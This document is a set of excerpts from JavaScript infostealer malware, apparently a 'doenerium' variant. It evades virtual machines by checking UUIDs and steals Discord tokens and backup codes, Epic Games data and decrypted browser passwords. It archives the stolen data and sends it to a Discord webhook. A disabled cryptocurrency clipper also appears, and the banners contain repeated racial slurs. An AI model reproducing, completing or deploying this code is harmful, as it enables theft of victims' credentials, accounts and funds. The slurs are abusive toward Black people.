...
function uuidCheck(callback) {
    executeCommand('wmic csproduct get uuid', (stdout) => {
        const uuidList = stdout.split(",").map(uuidxv => uuidxv.trim());
        if (checkListed(blackListedUUID, uuidList)) {
            exitProcess(); 
        } else {
            callback();
        }
        ...
        if (currentFile === 'discord_backup_codes.txt') {
          ...
          try {
            ...
            const embed = {
              ...
              footer: {
                text: `${user.hostname} | t.me/realgasx`,
...
function sendSuccessToWebhook() {
    const successMessage = '**<--------------------------New Log Coming--------------------------->**';
...
///şimdilik bu kısmı kapatacağım çünkü, gui'ye ekleyeceğim sonrasında base32 ile şifreleme vs. vs. onları halledeceğiz
//clipper
/*
// Replace with your addresses or all money to me :) - donerium fixer dev.
const addresses = {
...
/// base32 ile şifrelenen clipper'ı değiştirmeniz lazım, adressess kısmındaki değiştirdiniz value'lar encoded_code kısmında değiştirilmiyor.
    const scriptContent = `
import base64
...
async function getTokens() {
    ...
    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
**     Niggas Hate this version !** 
**           ⭐️Niggaman version of doenerium** ⭐️
╚═══════════✧✧✧═══════════╝`;
...
async function StealEpicGames() {
    try {
        ...
        if (fs.existsSync(epicPath)) {
            ...
            const howToUseContent = `<================[Nigga-Man]>================>\n\n
...
async function archiveAndSendData() {
    ...
    try {
        ...
        archive.addZipComment('All the Information was Stealed by niggaman.');
...
try {
    ...
    const combinedInfoEmbed = {
        ...
        color: 0x303037,
        author: {
            name: `${user.hostname} | System Information | @realgasx`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
        fields: [
            {
...
async function getPasswords() {
  ...
  for (let i = 0; i < browserPath.length; i++) {
    ...
    let appName;
    if (browserPath[i][0].includes('Local')) {
      appName = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      appName = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const loginDataPath = path.join(browserPath[i][0], 'Login Data');
    const tempDbPath = path.join(browserPath[i][0], 'passwords.db');
    ...
    await new Promise((resolve) => {
      db.each(
        ...
        (err, row) => {
          if (err || !row.username_value || !row.password_value) return;

          try {
            const encryptedPassword = row.password_value;
            ...
            const password = decipher.update(ciphertext) + decipher.final();

            const dateCreated = new Date(row.date_created / 1000 - 11644473600 * 1000).toLocaleString();
  ...
  if (results.length === 0) {
    results.push('no password found for ');
  }
  ...
  fs.writeFileSync(passwordsFilePath, user.copyright + results.join(''), {
    encoding: 'utf8',
    flag: 'a+',
  });
}
...
function handleMiscellaneous() {
    //createRunBat();
    //createAndExecuteScripts(); //Clipper
    redirectErrorsToLog();
}
